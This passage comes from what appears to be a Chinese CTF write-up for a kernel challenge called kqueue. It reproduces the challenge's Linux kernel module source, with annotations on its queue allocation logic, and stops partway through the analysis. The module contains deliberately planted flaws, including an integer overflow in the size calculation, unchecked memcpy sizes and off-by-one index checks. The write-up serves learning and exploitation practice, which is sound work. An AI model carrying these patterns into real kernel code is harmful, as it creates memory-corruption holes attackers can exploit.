class=\"line\"></span><br><span class=\"line\">    <span class=\"comment\">/* Check for existence of the request kqueue */</span></span><br><span class=\"line\">    <span class=\"built_in\">queue</span> *<span class=\"built_in\">queue</span> = kqueues[request.queue_idx];</span><br><span class=\"line\">    <span class=\"keyword\">if</span>(!<span class=\"built_in\">queue</span>)</span><br><span class=\"line\">        err(<span class=\"string\">&quot;[-] Requested kqueue does not exist&quot;</span>);</span><br><span class=\"line\">    </span><br><span class=\"line\">    kfree(<span class=\"built_in\">queue</span>);</span><br><span class=\"line\">    <span class=\"built_in\">memset</span>(<span class=\"built_in\">queue</span>,<span class=\"number\">0</span>,<span class=\"built_in\">queue</span>-&gt;queue_size);</span><br><span class=\"line\">    kqueues[request.queue_idx] = <span class=\"literal\">NULL</span>;</span><br><span class=\"line\">    <span class=\"keyword\">return</span> <span class=\"number\">0</span>;</span><br><span class=\"line\">&#125;</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"type\">static</span> noinline <span class=\"type\">long</span> <span class=\"title function_\">edit_kqueue</span><span class=\"params\">(<span class=\"type\">request_t</span> request)</span>&#123;</span><br><span class=\"line\">    <span class=\"comment\">/* Check the idx of the kqueue */</span></span><br><span class=\"line\">    <span class=\"keyword\">if</span>(request.queue_idx &gt; MAX_QUEUES)</span><br><span class=\"line\">        err(<span class=\"string\">&quot;[-] Invalid kqueue idx&quot;</span>);</span><br><span class=\"line\"></span><br><span class=\"line\">    <span class=\"comment\">/* Check if the kqueue exists at that idx */</span></span><br><span class=\"line\">    <span class=\"built_in\">queue</span> *<span class=\"built_in\">queue</span> = kqueues[request.queue_idx];</span><br><span class=\"line\">    <span class=\"keyword\">if</span>(!<span class=\"built_in\">queue</span>)</span><br><span class=\"line\">        err(<span class=\"string\">&quot;[-] kqueue does not exist&quot;</span>);</span><br><span class=\"line\"></span><br><span class=\"line\">    <span class=\"comment\">/* Check the idx of the kqueue entry */</span></span><br><span class=\"line\">    <span class=\"keyword\">if</span>(request.entry_idx &gt; <span class=\"built_in\">queue</span>-&gt;max_entries)</span><br><span class=\"line\">        err(<span class=\"string\">&quot;[-] Invalid kqueue entry_idx&quot;</span>);</span><br><span class=\"line\"></span><br><span class=\"line\">    <span class=\"comment\">/* Get to the kqueue entry memory */</span></span><br><span class=\"line\">    queue_entry *kqueue_entry = (queue_entry *)(<span class=\"built_in\">queue</span> + (<span class=\"keyword\">sizeof</span>(<span class=\"built_in\">queue</span>)+<span class=\"number\">1</span>)/<span class=\"number\">8</span>);</span><br><span class=\"line\"></span><br><span class=\"line\">    <span class=\"comment\">/* Check for the existence of the kqueue entry */</span></span><br><span class=\"line\">    exists = <span class=\"literal\">false</span>;</span><br><span class=\"line\">    <span class=\"type\">uint32_t</span> i=<span class=\"number\">1</span>;</span><br><span class=\"line\">    <span class=\"keyword\">for</span>(i=<span class=\"number\">1</span>;i&lt;<span class=\"built_in\">queue</span>-&gt;max_entries+<span class=\"number\">1</span>;i++)&#123;</span><br><span class=\"line\">        </span><br><span class=\"line\">        <span class=\"comment\">/* If kqueue entry found , do the necessary */</span></span><br><span class=\"line\">        <span class=\"keyword\">if</span>(kqueue_entry &amp;&amp; request.data &amp;&amp; <span class=\"built_in\">queue</span>-&gt;data_size)&#123;</span><br><span class=\"line\">            <span class=\"keyword\">if</span>(kqueue_entry-&gt;idx == request.entry_idx)&#123;</span><br><span class=\"line\">                validate(<span class=\"built_in\">memcpy</span>(kqueue_entry-&gt;data,request.data,<span class=\"built_in\">queue</span>-&gt;data_size));</span><br><span class=\"line\">                exists = <span class=\"literal\">true</span>;</span><br><span class=\"line\">            &#125;</span><br><span class=\"line\">        &#125;</span><br><span class=\"line\">        kqueue_entry = kqueue_entry-&gt;next;</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\"></span><br><span class=\"line\">    <span class=\"comment\">/* What if the idx is 0, it means we have to update the main kqueue&#x27;s data */</span></span><br><span class=\"line\">    <span class=\"keyword\">if</span>(request.entry_idx==<span class=\"number\">0</span> &amp;&amp; kqueue_entry &amp;&amp; request.data &amp;&amp; <span class=\"built_in\">queue</span>-&gt;data_size)&#123;</span><br><span class=\"line\">        validate(<span class=\"built_in\">memcpy</span>(<span class=\"built_in\">queue</span>-&gt;data,request.data,<span class=\"built_in\">queue</span>-&gt;data_size));</span><br><span class=\"line\">        <span class=\"keyword\">return</span> <span class=\"number\">0</span>;</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\"></span><br><span class=\"line\">    <span class=\"keyword\">if</span>(!exists)</span><br><span class=\"line\">        <span class=\"keyword\">return</span> NOT_EXISTS;</span><br><span class=\"line\">    <span class=\"keyword\">return</span> <span class=\"number\">0</span>;</span><br><span class=\"line\">&#125; </span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"comment\">/* Now you have the option to safely preserve your precious kqueues */</span></span><br><span class=\"line\"><span class=\"type\">static</span> noinline <span class=\"type\">long</span> <span class=\"title function_\">save_kqueue_entries</span><span class=\"params\">(<span class=\"type\">request_t</span> request)</span>&#123;</span><br><span class=\"line\"></span><br><span class=\"line\">    <span class=\"comment\">/* Check for out of bounds queue_idx requests */</span></span><br><span class=\"line\">    <span class=\"keyword\">if</span>(request.queue_idx &gt; MAX_QUEUES)</span><br><span class=\"line\">        err(<span class=\"string\">&quot;[-] Invalid kqueue idx&quot;</span>);</span><br><span class=\"line\"></span><br><span class=\"line\">    <span class=\"comment\">/* Check if queue is already saved or not */</span></span><br><span class=\"line\">    <span class=\"keyword\">if</span>(isSaved[request.queue_idx]==<span class=\"literal\">true</span>)</span><br><span class=\"line\">        err(<span class=\"string\">&quot;[-] Queue already saved&quot;</span>);</span><br><span class=\"line\"></span><br><span class=\"line\">    <span class=\"built_in\">queue</span> *<span class=\"built_in\">queue</span> = validate(kqueues[request.queue_idx]);</span><br><span class=\"line\"></span><br><span class=\"line\">    <span class=\"comment\">/* Check if number of requested entries exceed the existing entries */</span></span><br><span class=\"line\">    <span class=\"keyword\">if</span>(request.max_entries &lt; <span class=\"number\">1</span> || request.max_entries &gt; <span class=\"built_in\">queue</span>-&gt;max_entries)</span><br><span class=\"line\">        err(<span class=\"string\">&quot;[-] Invalid entry count&quot;</span>);</span><br><span class=\"line\"></span><br><span class=\"line\">    <span class=\"comment\">/* Allocate memory for the kqueue to be saved */</span></span><br><span class=\"line\">    <span class=\"type\">char</span> *new_queue = validate((<span class=\"type\">char</span> *)kzalloc(<span class=\"built_in\">queue</span>-&gt;queue_size,GFP_KERNEL));</span><br><span class=\"line\"></span><br><span class=\"line\">    <span class=\"comment\">/* Each saved entry can have its own size */</span></span><br><span class=\"line\">    <span class=\"keyword\">if</span>(request.data_size &gt; <span class=\"built_in\">queue</span>-&gt;queue_size)</span><br><span class=\"line\">        err(<span class=\"string\">&quot;[-] Entry size limit exceed&quot;</span>);</span><br><span class=\"line\"></span><br><span class=\"line\">    <span class=\"comment\">/* Copy main&#x27;s queue&#x27;s data */</span></span><br><span class=\"line\">    <span class=\"keyword\">if</span>(<span class=\"built_in\">queue</span>-&gt;data &amp;&amp; request.data_size)</span><br><span class=\"line\">        validate(<span class=\"built_in\">memcpy</span>(new_queue,<span class=\"built_in\">queue</span>-&gt;data,request.data_size));</span><br><span class=\"line\">    <span class=\"keyword\">else</span></span><br><span class=\"line\">        err(<span class=\"string\">&quot;[-] Internal error&quot;</span>);</span><br><span class=\"line\">    new_queue += <span class=\"built_in\">queue</span>-&gt;data_size;</span><br><span class=\"line\"></span><br><span class=\"line\">    <span class=\"comment\">/* Get to the entries of the kqueue */</span></span><br><span class=\"line\">    queue_entry *kqueue_entry = (queue_entry *)(<span class=\"built_in\">queue</span> + (<span class=\"keyword\">sizeof</span>(<span class=\"built_in\">queue</span>)+<span class=\"number\">1</span>)/<span class=\"number\">8</span>);</span><br><span class=\"line\"></span><br><span class=\"line\">    <span class=\"comment\">/* copy all possible kqueue entries */</span></span><br><span class=\"line\">    <span class=\"type\">uint32_t</span> i=<span class=\"number\">0</span>;</span><br><span class=\"line\">    <span class=\"keyword\">for</span>(i=<span class=\"number\">1</span>;i&lt;request.max_entries+<span class=\"number\">1</span>;i++)&#123;</span><br><span class=\"line\">        <span class=\"keyword\">if</span>(!kqueue_entry || !kqueue_entry-&gt;data)</span><br><span class=\"line\">            <span class=\"keyword\">break</span>;</span><br><span class=\"line\">        <span class=\"keyword\">if</span>(kqueue_entry-&gt;data &amp;&amp; request.data_size)</span><br><span class=\"line\">            validate(<span class=\"built_in\">memcpy</span>(new_queue,kqueue_entry-&gt;data,request.data_size));</span><br><span class=\"line\">        <span class=\"keyword\">else</span></span><br><span class=\"line\">            err(<span class=\"string\">&quot;[-] Internal error&quot;</span>);</span><br><span class=\"line\">        kqueue_entry = kqueue_entry-&gt;next;</span><br><span class=\"line\">        new_queue += <span class=\"built_in\">queue</span>-&gt;data_size;</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\"></span><br><span class=\"line\">    <span class=\"comment\">/* Mark the queue as saved */</span></span><br><span class=\"line\">    isSaved[request.queue_idx] = <span class=\"literal\">true</span>;</span><br><span class=\"line\">    <span class=\"keyword\">return</span> <span class=\"number\">0</span>;</span><br><span class=\"line\">&#125;</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"meta\">#<span class=\"keyword\">pragma</span> GCC pop_options</span></span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"type\">static</span> <span class=\"type\">int</span> __init <span class=\"title function_\">init_kqueue</span><span class=\"params\">(<span class=\"type\">void</span>)</span>&#123;</span><br><span class=\"line\">    mutex_init(&amp;operations_lock);</span><br><span class=\"line\">    reg = misc_register(&amp;kqueue_device);</span><br><span class=\"line\">    <span class=\"keyword\">if</span>(reg &lt; <span class=\"number\">0</span>)&#123;</span><br><span class=\"line\">        mutex_destroy(&amp;operations_lock);</span><br><span class=\"line\">        err(<span class=\"string\">&quot;[-] Failed to register kqueue&quot;</span>);</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">    <span class=\"keyword\">return</span> <span class=\"number\">0</span>;</span><br><span class=\"line\">&#125;</span><br><span class=\"line\"></span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"type\">static</span> <span class=\"type\">void</span> __exit <span class=\"title function_\">exit_kqueue</span><span class=\"params\">(<span class=\"type\">void</span>)</span>&#123;</span><br><span class=\"line\">    misc_deregister(&amp;kqueue_device);</span><br><span class=\"line\">&#125;</span><br><span class=\"line\"></span><br><span class=\"line\">module_init(init_kqueue);</span><br><span class=\"line\">module_exit(exit_kqueue);</span><br><span class=\"line\"></span><br></pre></td></tr></table></figure>\n<p>代码比较场我们一点点分析</p>\n<h3 id=\"kqueue_ioctl\"><a class=\"markdownIt-Anchor\" href=\"#kqueue_ioctl\">#</a> kqueue_ioctl</h3>\n<figure class=\"highlight c\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br><span class=\"line\">22</span><br><span class=\"line\">23</span><br><span class=\"line\">24</span><br><span class=\"line\">25</span><br><span class=\"line\">26</span><br><span class=\"line\">27</span><br><span class=\"line\">28</span><br><span class=\"line\">29</span><br><span class=\"line\">30</span><br><span class=\"line\">31</span><br><span class=\"line\">32</span><br><span class=\"line\">33</span><br><span class=\"line\">34</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"type\">static</span> noinline <span class=\"type\">long</span> <span class=\"title function_\">kqueue_ioctl</span><span class=\"params\">(<span class=\"keyword\">struct</span> file *file, <span class=\"type\">unsigned</span> <span class=\"type\">int</span> cmd, <span class=\"type\">unsigned</span> <span class=\"type\">long</span> arg)</span>&#123;</span><br><span class=\"line\"></span><br><span class=\"line\">    <span class=\"type\">long</span> result;</span><br><span class=\"line\"></span><br><span class=\"line\">    <span class=\"type\">request_t</span> request;</span><br><span class=\"line\">    </span><br><span class=\"line\">    mutex_lock(&amp;operations_lock);</span><br><span class=\"line\"></span><br><span class=\"line\">    <span class=\"keyword\">if</span> (copy_from_user((<span class=\"type\">void</span> *)&amp;request, (<span class=\"type\">void</span> *)arg, <span class=\"keyword\">sizeof</span>(<span class=\"type\">request_t</span>)))&#123;</span><br><span class=\"line\">        err(<span class=\"string\">&quot;[-] copy_from_user failed&quot;</span>);</span><br><span class=\"line\">        <span class=\"keyword\">goto</span> ret;</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\"></span><br><span class=\"line\">    <span class=\"keyword\">switch</span>(cmd)&#123;</span><br><span class=\"line\">        <span class=\"keyword\">case</span> CREATE_KQUEUE:</span><br><span class=\"line\">            result = create_kqueue(request);</span><br><span class=\"line\">            <span class=\"keyword\">break</span>;</span><br><span class=\"line\">        <span class=\"keyword\">case</span> DELETE_KQUEUE:</span><br><span class=\"line\">            result = delete_kqueue(request);</span><br><span class=\"line\">            <span class=\"keyword\">break</span>;</span><br><span class=\"line\">        <span class=\"keyword\">case</span> EDIT_KQUEUE:</span><br><span class=\"line\">            result = edit_kqueue(request);</span><br><span class=\"line\">            <span class=\"keyword\">break</span>;</span><br><span class=\"line\">        <span class=\"keyword\">case</span> SAVE:</span><br><span class=\"line\">            result = save_kqueue_entries(request);</span><br><span class=\"line\">            <span class=\"keyword\">break</span>;</span><br><span class=\"line\">        <span class=\"keyword\">default</span>:</span><br><span class=\"line\">            result = INVALID;</span><br><span class=\"line\">            <span class=\"keyword\">break</span>;</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">ret: </span><br><span class=\"line\">    mutex_unlock(&amp;operations_lock);</span><br><span class=\"line\">    <span class=\"keyword\">return</span> result;</span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure>\n<p>ioctl 函数，用于我们与设备的通信。首先会从用户态拷贝 request 的数据。一些重要结构体的定义如下</p>\n<h3 id=\"结构体\"><a class=\"markdownIt-Anchor\" href=\"#结构体\">#</a> 结构体</h3>\n<figure class=\"highlight c\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br><span class=\"line\">22</span><br><span class=\"line\">23</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"keyword\">typedef</span> <span class=\"class\"><span class=\"keyword\">struct</span>&#123;</span></span><br><span class=\"line\">    <span class=\"type\">uint32_t</span> max_entries;</span><br><span class=\"line\">    <span class=\"type\">uint16_t</span> data_size;</span><br><span class=\"line\">    <span class=\"type\">uint16_t</span> entry_idx;</span><br><span class=\"line\">    <span class=\"type\">uint16_t</span> queue_idx;</span><br><span class=\"line\">    <span class=\"type\">char</span>* data;</span><br><span class=\"line\">&#125;<span class=\"type\">request_t</span>;</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"keyword\">typedef</span> <span class=\"class\"><span class=\"keyword\">struct</span>&#123;</span></span><br><span class=\"line\">    <span class=\"type\">uint16_t</span> data_size;</span><br><span class=\"line\">    <span class=\"type\">uint64_t</span> queue_size; <span class=\"comment\">/* This needs to handle larger numbers */</span></span><br><span class=\"line\">    <span class=\"type\">uint32_t</span> max_entries;</span><br><span class=\"line\">    <span class=\"type\">uint16_t</span> idx;</span><br><span class=\"line\">    <span class=\"type\">char</span>* data;</span><br><span class=\"line\">&#125;<span class=\"built_in\">queue</span>;</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"keyword\">typedef</span> <span class=\"class\"><span class=\"keyword\">struct</span> <span class=\"title\">queue_entry</span> <span class=\"title\">queue_entry</span>;</span></span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"class\"><span class=\"keyword\">struct</span> <span class=\"title\">queue_entry</span>&#123;</span>\t\t\t\t\t\t<span class=\"comment\">//队列的节点</span></span><br><span class=\"line\">    <span class=\"type\">uint16_t</span> idx;\t\t\t\t\t\t<span class=\"comment\">//节点的位置</span></span><br><span class=\"line\">    <span class=\"type\">char</span> *data;</span><br><span class=\"line\">    queue_entry *next;</span><br><span class=\"line\">&#125;;</span><br></pre></td></tr></table></figure>\n<p>然后就是根据我们输入的 cmd 进行操作，可以看到是我们熟悉的增删改操作。</p>\n<h3 id=\"create_kqueue\"><a class=\"markdownIt-Anchor\" href=\"#create_kqueue\">#</a> create_kqueue</h3>\n<figure class=\"highlight c\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br><span class=\"line\">22</span><br><span class=\"line\">23</span><br><span class=\"line\">24</span><br><span class=\"line\">25</span><br><span class=\"line\">26</span><br><span class=\"line\">27</span><br><span class=\"line\">28</span><br><span class=\"line\">29</span><br><span class=\"line\">30</span><br><span class=\"line\">31</span><br><span class=\"line\">32</span><br><span class=\"line\">33</span><br><span class=\"line\">34</span><br><span class=\"line\">35</span><br><span class=\"line\">36</span><br><span class=\"line\">37</span><br><span class=\"line\">38</span><br><span class=\"line\">39</span><br><span class=\"line\">40</span><br><span class=\"line\">41</span><br><span class=\"line\">42</span><br><span class=\"line\">43</span><br><span class=\"line\">44</span><br><span class=\"line\">45</span><br><span class=\"line\">46</span><br><span class=\"line\">47</span><br><span class=\"line\">48</span><br><span class=\"line\">49</span><br><span class=\"line\">50</span><br><span class=\"line\">51</span><br><span class=\"line\">52</span><br><span class=\"line\">53</span><br><span class=\"line\">54</span><br><span class=\"line\">55</span><br><span class=\"line\">56</span><br><span class=\"line\">57</span><br><span class=\"line\">58</span><br><span class=\"line\">59</span><br><span class=\"line\">60</span><br><span class=\"line\">61</span><br><span class=\"line\">62</span><br><span class=\"line\">63</span><br><span class=\"line\">64</span><br><span class=\"line\">65</span><br><span class=\"line\">66</span><br><span class=\"line\">67</span><br><span class=\"line\">68</span><br><span class=\"line\">69</span><br><span class=\"line\">70</span><br><span class=\"line\">71</span><br><span class=\"line\">72</span><br><span class=\"line\">73</span><br><span class=\"line\">74</span><br><span class=\"line\">75</span><br><span class=\"line\">76</span><br><span class=\"line\">77</span><br><span class=\"line\">78</span><br><span class=\"line\">79</span><br><span class=\"line\">80</span><br><span class=\"line\">81</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"type\">static</span> noinline <span class=\"type\">long</span> <span class=\"title function_\">create_kqueue</span><span class=\"params\">(<span class=\"type\">request_t</span> request)</span>&#123;</span><br><span class=\"line\">    <span class=\"type\">long</span> result = INVALID;</span><br><span class=\"line\"></span><br><span class=\"line\">    <span class=\"keyword\">if</span>(queueCount &gt; MAX_QUEUES)\t\t\t\t\t\t\t\t\t\t\t\t<span class=\"comment\">//MAX_QUEUES= 5</span></span><br><span class=\"line\">        err(<span class=\"string\">&quot;[-] Max queue count reached&quot;</span>);\t\t\t\t\t<span class=\"comment\">//限制创建的数目为5</span></span><br><span class=\"line\"></span><br><span class=\"line\">    <span class=\"comment\">/* You can&#x27;t ask for 0 queues , how meaningless */</span></span><br><span class=\"line\">    <span class=\"keyword\">if</span>(request.max_entries&lt;<span class=\"number\">1</span>)\t\t\t\t\t\t\t\t<span class=\"comment\">//我们创建的队列至少有一个节点</span></span><br><span class=\"line\">        err(<span class=\"string\">&quot;[-] kqueue entries should be greater than 0&quot;</span>);</span><br><span class=\"line\"></span><br><span class=\"line\">    <span class=\"comment\">/* Asking for too much is also not good */</span></span><br><span class=\"line\">    <span class=\"keyword\">if</span>(request.data_size&gt;MAX_DATA_SIZE)\t\t\t\t\t\t<span class=\"comment\">//限制data的数据大小为0x20</span></span><br><span class=\"line\">        err(<span class=\"string\">&quot;[-] kqueue data size exceed&quot;</span>);</span><br><span class=\"line\"></span><br><span class=\"line\">    <span class=\"comment\">/* Initialize kqueue_entry structure */</span></span><br><span class=\"line\">    queue_entry *kqueue_entry;\t\t\t\t\t\t\t\t<span class=\"comment\">//初始化节点指针</span></span><br><span class=\"line\"></span><br><span class=\"line\">    <span class=\"comment\">/* Check if multiplication of 2 64 bit integers results in overflow */</span></span><br><span class=\"line\">    ull space = <span class=\"number\">0</span>;</span><br><span class=\"line\">    <span class=\"keyword\">if</span>(__builtin_umulll_overflow(<span class=\"keyword\">sizeof</span>(queue_entry),(request.max_entries+<span class=\"number\">1</span>),&amp;space) == <span class=\"literal\">true</span>)</span><br><span class=\"line\">        err(<span class=\"string\">&quot;[-] Integer overflow&quot;</span>);</span><br><span class=\"line\"><span class=\"comment\">//Gcc 的内部函数，space= sizeof(queue_entry) * (request.max_entries+1)；每一个entry可以理解为一个node</span></span><br><span class=\"line\">    <span class=\"comment\">/* Size is the size of queue structure + size of entry * request entries */</span></span><br><span class=\"line\">    ull queue_size = <span class=\"number\">0</span>;</span><br><span class=\"line\">    <span class=\"keyword\">if</span>(__builtin_saddll_overflow(<span class=\"keyword\">sizeof</span>(<span class=\"built_in\">queue</span>),space,&amp;queue_size) == <span class=\"literal\">true</span>)</span><br><span class=\"line\">        err(<span class=\"string\">&quot;[-] Integer overflow&quot;</span>);</span><br><span class=\"line\"><span class=\"comment\">//Gcc 的内部函数，queue_size = sizeof(queue) + space</span></span><br><span class=\"line\">    <span class=\"comment\">/* Total size should not exceed a certain limit */</span></span><br><span class=\"line\">    <span class=\"keyword\">if</span>(queue_size&gt;<span class=\"keyword\">sizeof</span>(<span class=\"built_in\">queue</span>) + <span class=\"number\">0x10000</span>)</span><br><span class=\"line\">        err(<span class=\"string\">&quot;[-] Max kqueue alloc limit reached&quot;</span>);</span><br><span class=\"line\"></span><br><span class=\"line\">    <span class=\"comment\">/* All checks done , now call kzalloc */</span></span><br><span class=\"line\">    <span class=\"built_in\">queue</span> *<span class=\"built_in\">queue</span> = validate((<span class=\"type\">char</span> *)kmalloc(queue_size,GFP_KERNEL));</span><br><span class=\"line\"><span class=\"comment\">//创建队列，queue_size = sizeof(queue_entry) * (request.max_entries+1) + sizeof(queue)；</span></span><br><span class=\"line\">    <span class=\"comment\">/* Main queue can also store data */</span></span><br><span class=\"line\">    <span class=\"built_in\">queue</span>-&gt;data = validate((<span class=\"type\">char</span> *)kmalloc(request.data_size,GFP_KERNEL));</span><br><span class=\"line\"></span><br><span class=\"line\">    <span class=\"comment\">/* Fill the remaining queue structure */</span></span><br><span class=\"line\">    <span class=\"built_in\">queue</span>-&gt;data_size   = request.data_size;</span><br><span class=\"line\">    <span class=\"built_in\">queue</span>-&gt;max_entries = request.max_entries;</span><br><span class=\"line\">    <span class=\"built_in\">queue</span>-&gt;queue_size  = queue_size;</span><br><span class=\"line\"></span><br><span class=\"line\">    <span class=\"comment\">/* Get to the place from where memory has to be handled */</span></span><br><span class=\"line\">    kqueue_entry = (queue_entry *)((<span class=\"type\">uint64_t</span>)(<span class=\"built_in\">queue</span> + (<span class=\"keyword\">sizeof</span>(<span class=\"built_in\">queue</span>)+<span class=\"number\">1</span>)/<span class=\"number\">8</span>));<span class=\"comment\">//(&amp;queue+0x18)指向的是第一个节点的位置</span></span><br><span class=\"line\"></span><br><span class=\"line\">    <span class=\"comment\">/* Allocate all kqueue entries */</span></span><br><span class=\"line\">    queue_entry* current_entry = kqueue_entry;</span><br><span class=\"line\">    queue_entry* prev_entry = current_entry;</span><br><span class=\"line\"></span><br><span class=\"line\">    <span class=\"type\">uint32_t</span> i=<span class=\"number\">1</span>;</span><br><span class=\"line\">    <span class=\"keyword\">for</span>(i=<span class=\"number\">1</span>;i&lt;request.max_entries+<span class=\"number\">1</span>;i++)&#123;</span><br><span class=\"line\">        <span class=\"keyword\">if</span>(i!=request.max_entries)</span><br><span class=\"line\">            prev_entry-&gt;next = <span class=\"literal\">NULL</span>;</span><br><span class=\"line\">        current_entry-&gt;idx = i;</span><br><span class=\"line\">        current_entry-&gt;data = (<span class=\"type\">char</span> *)(validate((<span class=\"type\">char</span> *)kmalloc(request.data_size,GFP_KERNEL)));</span><br><span class=\"line\"></span><br><span class=\"line\">        <span class=\"comment\">/* Increment current_entry by size of queue_entry */</span></span><br><span class=\"line\">        current_entry += <span class=\"keyword\">sizeof</span>(queue_entry)/<span class=\"number\">16</span>;\t\t\t<span class=\"comment\">//（queue_entry *）current_entry +=1，指向下一个结构体，所有的节点在queue空间是线性的，所以这个queue的空间其实就是queue(队列头信息) + n*queue_entry,</span></span><br><span class=\"line\">        </span><br><span class=\"line\"></span><br><span class=\"line\">        <span class=\"comment\">/* Populate next pointer of the previous entry */</span></span><br><span class=\"line\">        prev_entry-&gt;next = current_entry;\t\t\t\t\t<span class=\"comment\">//尾插法</span></span><br><span class=\"line\">        prev_entry = prev_entry-&gt;next;</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\"></span><br><span class=\"line\">    <span class=\"comment\">/* Find an appropriate slot in kqueues */</span></span><br><span class=\"line\">    <span class=\"type\">uint32_t</span> j = <span class=\"number\">0</span>;</span><br><span class=\"line\">    <span class=\"keyword\">for</span>(j=<span class=\"number\">0</span>;j&lt;MAX_QUEUES;j++)&#123;\t\t\t\t\t\t\t<span class=\"comment\">//所有的队列形成一个数组kqueues,定义在头文件里</span></span><br><span class=\"line\">        <span class=\"keyword\">if</span>(kqueues[j] == <span class=\"literal\">NULL</span>)</span><br><span class=\"line\">            <span class=\"keyword\">break</span>;</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\"><span class=\"comment\">//queue *kqueues[MAX_QUEUES] = &#123;(queue *)NULL&#125;;</span></span><br><span class=\"line\">    <span class=\"keyword\">if</span>(j&gt;MAX_QUEUES)</span><br><span class=\"line\">        err(<span class=\"string\">&quot;[-] No kqueue slot left&quot;</span>);</span><br><span class=\"line\"></span><br><span class=\"line\">    <span class=\"comment\">/* Assign the newly created kqueue to the kqueues */</span></span><br><span class=\"line\">    kqueues[j] = <span class=\"built_in\">queue</span>;</span><br><span class=\"line\">    queueCount++;</span><br><span class=\"line\">    result = <span class=\"number\">0</span>;</span><br><span class=\"line\">    <span class=\"keyword\">return</span> result;</span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure>\n<p>整个创建新的 kqueue 的函数还是比较繁琐的，注释写道代码里</p>\n<p>大概就是，我们创建一个队列，整个队列包含所有的节点结构体，每个结构体的 data 指向一个新的堆块。然后把这个队列的头指针放入一个全局的数组。</p>\n<h3 id=\"delete_kqueue\"><a class=\"markdownIt-Anchor\" href=\"#delete_kqueue\">#</a> delete_kqueue</h3>\n<figure class=\"highlight c\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"type\">static</span> noinline <span class=\"type\">long</span> <span class=\"title function_\">delete_kqueue</span><span class=\"params\">(<span class=\"type\">request_t</span> request)</span>&#123;</span><br><span class=\"line\">    <span class=\"comment\">/* Check for out of bounds requests */</span></span><br><span class=\"line\">    <span class=\"keyword\">if</span>(request.queue_idx&gt;MAX_QUEUES)</span><br><span class=\"line\">        err(<span class=\"string\">&quot;[-] Invalid idx&quot;</span>);</span><br><span class=\"line\"></span><br><span class=\"line\">    <span class=\"comment\">/* Check for existence of the request kqueue */</span></span><br><span class=\"line\">    <span class=\"built_in\">queue</span> *<span class=\"built_in\">queue</span> = kqueues[request.queue_idx];</span><br><span class=\"line\">    <span class=\"keyword\">if</span>(!<span class=\"built_in\">queue</span>)</span><br><span class=\"line\">        err(<span class=\"string\">&quot;[-] Requested kqueue does not exist&quot;</span>);</span><br><span class=\"line\">    </span><br><span class=\"line\">    kfree(<span class=\"built_in\">queue</span>);</span><br><span class=\"line\">    <span class=\"built_in\">memset</span>(<span class=\"built_in\">queue</span>,<span class=\"number\">0</span>,<span class=\"built_in\">queue</span>-&gt;queue_size);</span><br><span class=\"line\">    kqueues[request.queue_idx] = <span class=\"literal\">NULL</span>;</span><br><span class=\"line\">    <span class=\"keyword\">return</span> <span class=\"number\">0</span>;</span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure>\n<p>这里会根据我们传入结构体的 queue_idx, 释放对应的 queue, 并且数据清空，不存在 uaf。</p>\n<h3 id=\"edit_kqueue\"><a class=\"markdownIt-Anchor\" 